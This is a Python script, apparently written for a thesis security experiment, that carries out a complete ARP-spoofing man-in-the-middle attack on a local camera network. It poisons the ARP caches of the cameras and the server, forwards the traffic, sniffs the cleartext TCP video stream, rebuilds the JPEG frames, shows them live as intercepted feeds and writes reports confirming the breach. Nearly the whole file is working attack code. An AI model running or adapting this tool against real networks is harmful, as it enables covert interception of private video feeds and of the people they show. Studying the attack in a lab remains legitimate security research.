"""
Erstellt von Gemini 3 Pro am 02.02.2026

MITM Video Sniffer 

Funktionen:
- ARP-Spoofing (Server-Targeting)
- Live-View im Grid-Layout (2x2)
- CSV-Logging aller abgefangenen Metadaten (Zeitstempel, Latenz)
- Extraktion der Kamera-Zeitstempel aus dem TCP-Stream
"""

import os
import sys
import time
import threading
import csv
import json
from datetime import datetime
from collections import defaultdict
from dataclasses import dataclass, field, asdict
import numpy as np

if os.geteuid() != 0:
    print("❌ Root-Rechte benötigt! Starte mit: sudo python3 tcp_sniffer_thesis_pro.py")
    sys.exit(1)

try:
    from scapy.all import ARP, Ether, IP, TCP, Raw, sendp, srp, sniff, get_if_hwaddr, conf
    import cv2
    conf.verb = 0
except ImportError:
    print("❌ Fehlende Bibliotheken. Installiere: pip install scapy opencv-python numpy")
    sys.exit(1)

CONFIG = {
    "server_ip": "192.168.0.100",  
    "server_port": 9000,
    "camera_ips": [
        "192.168.0.101", 
        "192.168.0.102", 
        "192.168.0.103" 
    ],
    "interface": "en0",
    "output_dir": "sniffer_results"
}

@dataclass
class SnifferReport:
    experiment_date: str = ""
    experiment_time: str = ""
    duration_seconds: float = 0
    target_server: str = ""
    
    total_frames_captured: int = 0
    total_bytes_captured: int = 0
    frames_per_camera: dict = field(default_factory=dict)
    
    avg_latency_ms: float = 0
    confidentiality_violated: bool = False
    vulnerability_confirmed: bool = False

class VideoSniffer:
    def __init__(self):
        self.running = False
        self.macs = {}
        try:
            self.my_mac = get_if_hwaddr(CONFIG["interface"])
        except:
            print("❌ Interface nicht gefunden!")
            sys.exit(1)
            
        self.buffers = defaultdict(bytes)
        self.latest_frames = {}
        self.frame_counts = defaultdict(int)
        self.latencies = []
        self.start_time = None
        self.lock = threading.Lock()
        
        self.report = SnifferReport()
        self.report.experiment_date = datetime.now().strftime("%Y-%m-%d")
        self.report.experiment_time = datetime.now().strftime("%H:%M:%S")
        self.report.target_server = f"{CONFIG['server_ip']}:{CONFIG['server_port']}"
        
        os.makedirs(CONFIG["output_dir"], exist_ok=True)
        self.run_id = datetime.now().strftime("%Y%m%d_%H%M%S")
        self.csv_file = os.path.join(CONFIG["output_dir"], f"sniffer_{self.run_id}_data.csv")
        
        with open(self.csv_file, 'w', newline='') as f:
            writer = csv.writer(f)
            writer.writerow(["Timestamp", "Rel_Time", "Camera_IP", "Camera_Name", "Size_Bytes", "Latency_ms"])

    def log_frame(self, src_ip, cam_name, size, cam_ts):
        now = time.time()
        rel_time = round(now - self.start_time, 2)
        ts_str = datetime.now().isoformat()
        
        latency = 0
        if cam_ts > 0:
            server_ts_ms = now * 1000
            latency = int(server_ts_ms - cam_ts)
            if 0 < latency < 5000:
                self.latencies.append(latency)

        self.report.total_frames_captured += 1
        self.report.total_bytes_captured += size
        self.report.frames_per_camera[cam_name] = self.report.frames_per_camera.get(cam_name, 0) + 1
        self.report.confidentiality_violated = True
        self.report.vulnerability_confirmed = True

        with open(self.csv_file, 'a', newline='') as f:
            writer = csv.writer(f)
            writer.writerow([ts_str, rel_time, src_ip, cam_name, size, latency])

    def enable_forwarding(self):
        os.system("sysctl -w net.inet.ip.forwarding=1 > /dev/null")

    def disable_forwarding(self):
        os.system("sysctl -w net.inet.ip.forwarding=0 > /dev/null")

    def get_mac(self, ip):
        if ip in self.macs: return self.macs[ip]
        try:
            ans, _ = srp(Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(pdst=ip), timeout=2, iface=CONFIG["interface"], verbose=False)
            for _, rcv in ans:
                self.macs[ip] = rcv[Ether].src
                return rcv[Ether].src
        except: pass
        return None

    def arp_spoof(self):
        while self.running:
            server_mac = self.macs.get(CONFIG["server_ip"])
            if not server_mac: 
                time.sleep(1)
                continue

            for cam_ip in CONFIG["camera_ips"]:
                cam_mac = self.macs.get(cam_ip)
                if not cam_mac: continue

                pkt_cam = Ether(dst=cam_mac)/ARP(op=2, pdst=cam_ip, hwdst=cam_mac, psrc=CONFIG["server_ip"], hwsrc=self.my_mac)
                sendp(pkt_cam, iface=CONFIG["interface"], verbose=False)

                pkt_srv = Ether(dst=server_mac)/ARP(op=2, pdst=CONFIG["server_ip"], hwdst=server_mac, psrc=cam_ip, hwsrc=self.my_mac)
                sendp(pkt_srv, iface=CONFIG["interface"], verbose=False)
            
            time.sleep(0.5)

    def restore_arp(self):
        print("🚑 Stelle ARP-Tabellen wieder her...")
        server_mac = self.macs.get(CONFIG["server_ip"])
        for cam_ip in CONFIG["camera_ips"]:
            cam_mac = self.macs.get(cam_ip)
            if cam_mac and server_mac:
                sendp(Ether(dst=cam_mac)/ARP(op=2, pdst=cam_ip, hwdst=cam_mac, psrc=CONFIG["server_ip"], hwsrc=server_mac), count=3, iface=CONFIG["interface"], verbose=False)
                sendp(Ether(dst=server_mac)/ARP(op=2, pdst=CONFIG["server_ip"], hwdst=server_mac, psrc=cam_ip, hwsrc=cam_mac), count=3, iface=CONFIG["interface"], verbose=False)

    def parse_packet(self, pkt):
        if not pkt.haslayer(TCP) or not pkt.haslayer(Raw): return
        
        if pkt[IP].dst == CONFIG["server_ip"] and pkt[TCP].dport == CONFIG["server_port"]:
            src_ip = pkt[IP].src
            data = bytes(pkt[Raw].load)
            self.buffers[src_ip] += data
            
            while b"CAM:" in self.buffers[src_ip]:
                buf = self.buffers[src_ip]
                start = buf.find(b"CAM:")
                end_header = buf.find(b"\n", start)
                
                if end_header == -1: break
                
                try:
                    header = buf[start:end_header].decode(errors="ignore")
                    parts = header.split(":")
                    
                    if len(parts) >= 3:
                        cam_name = parts[1]
                        size = int(parts[2])
                        cam_ts = int(parts[3]) if len(parts) > 3 else 0
                        
                        img_start = end_header + 1
                        img_end = img_start + size
                        
                        if len(buf) >= img_end:
                            jpg_data = buf[img_start:img_end]

                            if jpg_data.endswith(b'\xff\xd9'):
                                try:
                                    nparr = np.frombuffer(jpg_data, np.uint8)
                                    test_img = cv2.imdecode(nparr, cv2.IMREAD_COLOR)
                                    
                                    if test_img is not None:
                                        with self.lock:
                                            self.latest_frames[cam_name] = jpg_data
                                            self.frame_counts[cam_name] += 1
                                        
                                        self.log_frame(src_ip, cam_name, size, cam_ts)
                                        print(f"\r📸 {cam_name}: Frame #{self.frame_counts[cam_name]} - OK     ", end="", flush=True)
                                        self.buffers[src_ip] = buf[img_end:]
                                    else:
                                        self.buffers[src_ip] = buf[img_end:]
                                except:
                                    self.buffers[src_ip] = buf[img_end:]
                            else:
                                self.buffers[src_ip] = buf[img_end:]
                        else:
                            break
                    else:
                        self.buffers[src_ip] = buf[start+4:]
                except Exception:
                    self.buffers[src_ip] = buf[start+1:]

    def run_sniffer(self):
        try:
            sniff(iface=CONFIG["interface"], 
                  filter=f"tcp port {CONFIG['server_port']}", 
                  prn=self.parse_packet, 
                  store=0)
        except Exception as e:
            print(f"Sniffer Error: {e}")

    def generate_report(self):
        base = os.path.join(CONFIG["output_dir"], f"sniffer_{self.run_id}")
        
        self.report.duration_seconds = round(time.time() - self.start_time, 2)
        if self.latencies:
            self.report.avg_latency_ms = round(sum(self.latencies) / len(self.latencies), 2)

        with open(f"{base}_report.json", 'w') as f:
            json.dump(asdict(self.report), f, indent=2)

        md = f"""# Man-in-the-Middle Analysis Report

## Experiment Details
| Parameter | Value |
|-----------|-------|
| Date | {self.report.experiment_date} |
| Time | {self.report.experiment_time} |
| Duration | {self.report.duration_seconds}s |
| Target Server | {self.report.target_server} |

## Results
| Metric | Value |
|--------|-------|
| Total Frames Captured | {self.report.total_frames_captured} |
| Data Volume | {self.report.total_bytes_captured / 1024 / 1024:.2f} MB |
| Avg. Latency (Sniffer) | {self.report.avg_latency_ms} ms |

### Frames per Camera
| Camera | Frames |
|--------|--------|
"""
        for cam, count in self.report.frames_per_camera.items():
            md += f"| {cam} | {count} |\n"

        md += f"""
## Security Assessment
- **Confidentiality Violated:** {'🔴 YES' if self.report.confidentiality_violated else '🟢 NO'}
- **Vulnerability Confirmed:** {'🔴 YES' if self.report.vulnerability_confirmed else '🟢 NO'}

## Conclusion
The video stream is transmitted in cleartext (TCP). An attacker in the same subnet was able to intercept and reconstruct the video stream using ARP spoofing.
"""
        with open(f"{base}_summary.md", 'w') as f:
            f.write(md)
        
        print(f"\n✅ Reports gespeichert unter: {base}_*")

    def print_summary(self):
        print("\n" + "="*60)
        print(f"{'MITM ATTACK SUMMARY':^60}")
        print("="*60)
        print(f"  Dauer:           {round(time.time() - self.start_time, 1)}s")
        print(f"  Frames gesamt:   {self.report.total_frames_captured}")
        print(f"  Datenvolumen:    {self.report.total_bytes_captured / 1024 / 1024:.2f} MB")
        print("-" * 60)
        for cam, count in self.report.frames_per_camera.items():
            print(f"  🎥 {cam:<15} : {count:>5} Frames")
        print("-" * 60)
        print(f"  SCHWACHSTELLE BESTÄTIGT: {'JA ✅' if self.report.vulnerability_confirmed else 'NEIN ❌'}")
        print("="*60)

    def start(self):
        print(f"--- MITM VIDEO SNIFFER (THESIS PRO) ---")
        
        print("🔍 Suche MAC-Adressen...")
        srv_mac = self.get_mac(CONFIG["server_ip"])
        if not srv_mac:
            print(f"❌ Server {CONFIG['server_ip']} nicht erreichbar. Abbruch.")
            return

        for ip in CONFIG["camera_ips"]:
            self.get_mac(ip)
        
        print(f"✅ Ziele gefunden. Starte Angriff...")

        self.running = True
        self.start_time = time.time()
        self.enable_forwarding()

        t_arp = threading.Thread(target=self.arp_spoof, daemon=True)
        t_arp.start()

        t_sniff = threading.Thread(target=self.run_sniffer, daemon=True)
        t_sniff.start()

        print("📺 Live-View aktiv (Taste 'q' zum Beenden)...")
        
        try:
            while self.running:
                loop_start = time.time()
                
                with self.lock:
                    frames = self.latest_frames.copy()
                
                canvas = np.zeros((720, 1280, 3), dtype=np.uint8)
                positions = [(0,0), (0, 640), (360, 0), (360, 640)]
                cam_keys = sorted(frames.keys())
                
                for idx, cam in enumerate(cam_keys):
                    if idx >= 4: break
                    data = frames[cam]
                    try:
                        nparr = np.frombuffer(data, np.uint8)
                        img = cv2.imdecode(nparr, cv2.IMREAD_COLOR)
                        if img is not None:
                            img_resized = cv2.resize(img, (640, 360))
                            cv2.rectangle(img_resized, (0, 0), (640, 40), (0, 0, 0), -1)
                            cv2.putText(img_resized, f"ABGEFANGEN: {cam}", (10, 25), cv2.FONT_HERSHEY_SIMPLEX, 0.7, (0, 0, 255), 2)
                            y, x = positions[idx]
                            canvas[y:y+360, x:x+640] = img_resized
                    except: pass
                
                cv2.imshow("MITM Video Interception", canvas)
                
                if cv2.waitKey(33) & 0xFF == ord('q'):
                    self.running = False
                    break
                    
        except KeyboardInterrupt:
            pass
        finally:
            self.running = False
            cv2.destroyAllWindows()
            self.disable_forwarding()
            self.restore_arp()
            self.generate_report()
            self.print_summary()

if __name__ == "__main__":
    sniffer = VideoSniffer()
    sniffer.start()
